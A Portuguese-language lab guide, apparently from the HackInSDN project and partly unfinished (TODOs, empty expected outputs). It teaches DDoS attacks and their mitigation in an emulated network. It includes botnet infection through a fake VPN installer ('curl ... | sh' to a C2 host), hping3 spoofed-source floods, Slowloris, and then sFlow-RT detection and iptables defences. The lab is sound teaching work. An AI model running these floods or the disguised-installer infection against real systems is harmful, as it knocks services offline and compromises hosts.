# Roteiro de Laboratório - DDoS Ataques de Negação de Serviço Distribuídos

Neste laboratório vamos explorar os ataques de negação de serviço distribuídos, ou simplesmente **DDoS** (do inglês _Distributed Denial of Service_), cujo objetivo geral é indisponibilizar um serviço, usuário ou aplicação através do envio de tráfego malicioso originado em fontes distribuídas ou diversas. Existem diversos tipos de ataques DDoS, destacando-se: DDoS volumétrico; DDoS refletido e amplificado; e _Slow DDoS_. Alguns autores propõem classificações adicionais/diferentes, portanto a lista acima apresenta alguns tipos mais comuns e que serão explorados neste laboratório.

O cenário utilizado para esse laboratório é ilustrado na figura abaixo:

![Topology](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/topology.png)

Nesse cenário, uma organização fictícia que hospeda o site "HackInSDN.com" será vítima de ataques de negação de serviço distribuídos, tendo como alvo principal o servidor **srv1** que hospeda o site da organização. O atancante orquestra os ataques através do host **c2c** (ou C&C, do inglês _Command and Control_) que gerencia uma botnet de hosts comprometidos (h2, h4, h5, h6, h8 e h9) utilizados para disparar de fato o ataque. Clientes legítimos como o host **h1** (e também h3 e h7) serão afetados pelo ataque e observarão impacto na disponibilidade do site. Além do processo de orquestração e execução do ataque, este experimento também ilustra técnicas para detecção e contenção de tais ataques.

## Atividade 1 - Testes de funcionamento normal do cenário

Antes de iniciar o cenário de orquestração, execução e contenção dos ataques de DDoS, vamos fazer alguns testes de acesso ao ambiente e configurar a conectividade dos hosts.

1. O primeiro passo é verificar a conectividade entre o host **h1** e o servidor **srv1**. Para isso, abra o Mininet-Sec conforme ilustrado na imagem abaixo:

![lab04-ddos-resources-dashboard-mnsec.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-resources-dashboard-mnsec.png)

Você deve observar que uma nova aba no navegador é aberta com a topologia do Mininet-Sec conforme ilustrado abaixo:


 ping from h1 to srv1: falha

2. configurar Kytos com of-l2ls

```
ip netns exec mgmt python3 -m pip install -e git+https://github.com/kytos-ng/of_l2ls#egg=kytos-of-l2ls
```

Reiniciar o Kytos:
```
tmux send-keys -t kytos "exit" ENTER
sleep 5
pkill -9 kytosd
tmux new-session -d -s kytosserver "kytosd -f -E"
```

3. ping novamente: okay

4. curl http://192.168.1.254

5. testar com ali a partir do h1: ali --timeout 2s --duration 0 http://192.168.1.254

6. Abrir o console do Mininet-Sec na interface do Dashboard e rodar o comando dstat:

```
dstat --bits -t -n -N s1-eth8
```

Confirmar na interface do Mininet-Sec que a interface s1-eth8 é a interface que conecta o srv1 com o s1.

Comentar sobre o tráfego que é observado com o uso do software "ali".

## Atividade 2 - Orquestrando a formação da botnet

TODO: apresentar o cenário

1. Acessar o link do servico "http c2c" e falar sobre a pagina, falar sobre o risco de executar um script qualquer e ser infectado, falar que algumas pessoas foram infectadas

2. Modificar a URL e adicionar um /admin no final, logar com usuario "admin" e senha "hackinsdn"

3. Verificar os hosts que são mostrados, explicar que tratam-se de hosts infectados e funcionando como zumbis para efetuar ataques futuros.

4. Realizar um teste de ping para visualizar o volume gerado pelos hosts infectados.

```
timeout 60 ping -s 972 192.168.1.254
```

5. Mostrar como o h6 seria infectado, abrir o console do h6 e copiar o comando para supostamente instalar a VPN. Após executado, voltar a interface admin da botnet/command-and-controller e visualizar o h6 agora também infectado

```
curl -sfL http://192.168.1.250:5000/s/download-vpn | sh
```

Saída do portal de c2c

Saída do ps aux

6. Repetir o mesmo processo com o h8

```
curl -sfL http://192.168.1.250:5000/s/download-vpn | sh
```

Saída esperada:


7. Repetir o teste de ping para visualizar o volume gerado pelos hosts infectados


## Atividade 3 - Executando ataques de DDoS volumétrico

1. Na aba que está com o console do Mininet-Sec exibindo estatísticas de rede do srv1 com o dstat, checar que o volume está baixo e em conformidade com o uso da ferramenta "ali"

2. Recarregar a interface do C2C e checar que todos os hosts infectados continuam ativos

3. Na seção de Tasks, cadastrar uma nova Task para executar em 30 segundos com o seguinte comando:

```
timeout 120 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

4. Observar o volume de tráfego gerado para o srv1

5. Na aba do h1 que está com o "ali" em execução, observar as requisições com falha de timeout

6. No host h8, executar o seguinte comando e observar o resultado (notar que não aparece o hping3 mas sim um processo chamado "linux\_checker" o que pode confundir e passar despercebido pelo administrador):

```
ps aux
```

## Atividade 4 - Mitigando ataques de DDoS volumétrico com bloqueio de atacantes

TODO: falar sobre os tipos de mitigação e sobre ferramentas. bloqueio de ataques (blackhole)

1. Abrir o terminal do Mininet-Sec a partir do dashboard:

2. A partir do terminal do Mininet-Sec, instalar o Sflow-RT:

```
apt-get update && apt-get install --no-install-recommends -y default-jre
curl -sfL https://inmon.com/products/sFlow-RT/sflow-rt.tar.gz | tar -xz -C /opt/
```

3. Instalar a aplicação "HackInSDN Anti-DDoS" e a aplicação "Browse and trend traffic flows" no Sflow-RT.

Para instalar a aplicação hackinsdn-ddos:
```
/opt/sflow-rt/get-app.sh hackinsdn hackinsdn-ddos
```

Para instalar a aplicação browse-flows:
```
/opt/sflow-rt/get-app.sh sflow-rt browse-flows
```

4. Iniciar o Sflow-RT:

```
/opt/sflow-rt/start.sh
```

Saída esperada:

5. Agora vamos executar novamente o ataque de DDoS volumétrico contra o servidor web da organização HackInSDN.com. Na aba que possui o console admin do C2C aberto, adicionar uma nova Task para executar em 30 segundos e com o comando:

```
timeout 60 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

6. Na aba do terminal do MininetSec que estava executando o Sflow-RT, observe a saída:

Saída esperada...

7. Na aba que mostra a ferramenta "ali" executando um benchmark a partir de cliente legítimo h1, note que o acesso continua sendo impactado:

Saída esperada

8. Observe que o ataque foi detectado porém a aplicação HackInSDN Anti-DDoS estava configurada de forma a não realizar a mitigação automática. Para visualizar as configurações da aplicação HackInSDN Anti-DDoS, abra um novo terminal do Mininet-Sec a partir do Dashboard e execute o seguinte comando no terminal do Mininet-Sec:

```
curl -s http://127.0.0.1:8008/app/hackinsdn-ddos/scripts/hackinsdn-ddos.js/json
```

A saída esperada é mostrada a seguir:

Observe que a ação de mitigação está configurada como "none", o que significa que nenhuma ação será tomada.

9. Aguarde alguns segundos até o ataque finalizar.

10. Altere a ação de mitigação para DROP, descartando o tráfego malicioso:

```
curl -X POST -H 'Content-type: application/json' -s http://127.0.0.1:8008/app/hackinsdn-ddos/scripts/hackinsdn-ddos.js/json -d '{"action": "drop"}'
```

11. Repita novamente a execução do ataque a partir do console admin do C2C porém agora com uma duração maior (tempo para início do ataque: 30 segundos):

```
timeout 120 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

12. Obseve a saída do Sflow-RT:

Saída esperada

13. Observe agora o funcionamento de um cliente legítimo h1 executando o benchmark com a ferramenta "ali":

Saída esperada

14. No cenário acima, clientes legítimos que de alguma forma compartilham infraestrutura de rede com atacantes (cenário muitíssimo comum) também seriam impactados. Podemos comprovar essa observação, executaremos um teste de acesso web a partir do host h3 que compartilha infraestrutura de redes com hosts notodamente infectados (i.e, h2 e h4). Abra o terminal do h3 e execute o seguinte comando:

```
curl --max-time 10 http://192.168.1.254
```

A saída esperada é mostrada abaixo:

15. Aguarde o fim do ataque e observe que o Sflow-RT automaticamente remove o bloqueio:

16. Teste novamente o acesso a partir dos clientes legítimos h3 e h1 através do seguinte comando:

```
curl --max-time 10 http://192.168.1.254
```

## Atividade 5 - Mitigando ataques de DDoS volumétrico com limpeza de tráfego

TODO: na seção anterior foi possível observar que o ataque foi contido e o sistema passou a funcionar apesar do ataque, porém clientes legítimos que compartilham infraestrutura com atacantes foram impactados. A técnica de bloqueio de tráfego permite pode ser combinado com filtros que permitem bloquear o tráfego em pontos estratégicos, como tráfego internacional, tráfego vindo de determinado ponto de tráfego, entre outros; tudo depende das funcionalidades previstas no seu provedor de Internet. Outra opção seria as técnicas de limpeza de tráfego, que, a partir de alguma heurística, removem o tráfego de ataque ou tráfego malicioso e encaminham para o cliente apenas o tráfego benígno. Existem empresas que fornecem esse tipo de serviço a partir de diferentes estratégias (TODO: ref??????). Nesta seção vamos ilustrar uma solução simplificada de limpeza de tráfego.

1. No terminal do Mininet-Sec que configuramos a aplicação HackInSDN Anti-DDoS e vamos alterar o tipo de bloqueio:

```
curl -X POST -H 'Content-type: application/json' -s http://127.0.0.1:8008/app/hackinsdn-ddos/scripts/hackinsdn-ddos.js/json -d '{"action": "redirect", "redirect_to": 20}'
```

A porta 20, em particular, é a porta na qual o servidor de limpeza de tráfego está conectado. A ideia é que o tráfego será encaminhado para essa porta 20, o servidor de limpeza de tráfego irá remover o tráfego malicioso e permitir apenas o tráfego legítimo. No passo seguinte vamos configurar o servidor de limpeza de tráfego.


2. Abra o terminal do srv2 para configurarmos o servidor de limpeza de tráfego. A estratégia de limpeza de tráfego será bem simplificada: vamos permitir o tráfego a partir de uma lista de IPs confiáveis, e descartar todo tráfego adicional. Para isso execute os seguintes comandos no servidor srv2:

Primeiro vamos preparar o servidor de limpeza:
```
ip link add br0 type bridge
ip link set srv2-eth0 master br0
ip link set srv2-eth1 master br0
ebtables -A FORWARD --pkttype multicast -j DROP
ebtables -A FORWARD --pkttype broadcast -j DROP
ip link set br0 up
```

Em seguida vamos configurar as regras de filtragem que permitem o tráfego de IPs confiáveis e bloqueiam todo tráfego adicional:
```
iptables -P FORWARD DROP
iptables -A FORWARD -i br0 -s 192.168.1.0/24 -j ACCEPT
```

3. Repita novamente a execução do ataque a partir do console admin do C2C porém agora com uma duração maior (tempo para início do ataque: 30 segundos):

```
timeout 120 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
```

4. Obseve a saída do Sflow-RT:

Saída esperada

5. Observe agora o funcionamento de um cliente legítimo que compartilha infraestrutura de rede com clientes infectados. Para isso, navegue novamente para o terminal do h3 e execute o seguinte comando:

```
curl --max-time 10 http://192.168.1.254
```

A saída esperada é mostrada abaixo:


## Atividade 6 - Executando ataques de Slow DDoS

1. Na aba que está com o console do Mininet-Sec exibindo estatísticas de rede do srv1 com o **dstat**, checar que o volume está baixo e em conformidade com o uso da ferramenta "ali"

2. Recarregar a interface do C2C e checar que todos os hosts infectados continuam ativos

3. Na seção de Tasks, cadastrar uma nova Task para executar em 30 segundos com o seguinte comando:

```
timeout 120 slowloris -s 100 -p 80 --randuseragents 192.168.1.254
```

4. Observar o volume de tráfego gerado para o srv1 a partir da ferramenta **dstat** no terminal do Mininet-Sec:

Saída esperada: TODO

5. Observe que o volume de tráfego gerado é muito menor que no caso anterior. Nesse caso, ferramentas de detecção de ataques, como a aplicação HackInSDN Anti-DDoS no Sflow-RT, e muitas outras não são capazes de facilmente detectar o ataque. Por outro lado, os clientes legítimos são igualmente impactados. Para observar esse fato, aa aba do h1 que está com o "ali" em execução, observar as requisições com falha de timeout

Saída esperada: TODO

6. Aguarde alguns segundos até a finalização do ataque e observe que o benchmark na ferramenta "ali" no host h1 foi normalizado:

TODO: saída esperada

## Atividade 7 - Mitigando ataques de Slow DDoS

Nesta atividade vamos ilustrar uma possível metodologia para mitigação do ataque de Slow DDos motrado na seção anterior a partir de limitação de banda com o IPTables. É importante ressaltar que a estratégia ilustrada nessa seção tem uma finalidade meramente didática, portanto a abordagem de mitigação escolhida deve ser avaliada com cuidado antes de utilizar em outros cenários, pois pode impactar requisições legítimas em ambientes com uma quantidade de tráfego maior. Outras soluções mais robustas podem ser encontradas na literatura e nas aplicações comerciais. Recomendamos a leitura das referências a seguir para maiores informações: **TODO????**

1. No terminal do servidor srv1, execute os seguintes comandos para instalar o iptables:

```
ip netns exec mgmt apt-get update
ip netns exec mgmt apt-get install -y iptables
```

2. Aplicar configurações de limitação de banda para evitar as requisições potencialmente maliciosas:

```
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j REJECT --reject-with tcp-reset
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate RELATED,ESTABLISHED -m limit --limit 150/second -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j REJECT --reject-with tcp-reset
```

3. Repetir os testes da seção anterior e avaliar os resultados.
